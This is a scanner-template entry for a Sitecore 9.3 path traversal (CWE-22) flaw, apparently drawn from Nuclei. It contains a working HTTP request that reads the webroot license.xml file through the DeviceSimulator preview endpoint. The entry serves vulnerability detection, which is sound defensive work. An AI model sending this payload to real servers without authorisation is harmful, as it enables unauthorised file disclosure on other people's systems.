# Nuclei Template: Sitecore 9.3 - Webroot File Read
**Template ID:** sitecore-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`sitecore-lfi.yaml`)

## Vulnerability Information & PoC

## Description
SiteCore 9.3 is vulnerable to LFI.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml
```

## References
- https://blog.assetnote.io/2023/05/10/sitecore-round-two/
